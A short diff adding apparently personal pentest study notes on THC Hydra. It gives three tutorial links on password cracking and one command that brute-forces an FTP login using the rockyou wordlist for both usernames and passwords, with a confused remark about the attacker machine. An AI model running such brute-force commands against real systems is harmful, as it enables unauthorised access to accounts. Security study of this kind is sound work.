@@ -1,0 +1,11 @@
+## Hydra
+https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/ 
+https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-passwords-with-tamper-data-thc-hydra-0155374/ 
+https://cyberrunner.medium.com/how-to-crack-passwords-with-john-the-ripper-fdb98449ff1 
+
+#for ftp login 
+ftp ip 
+hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt ftp://ip (of attacker machine)
+
+
+
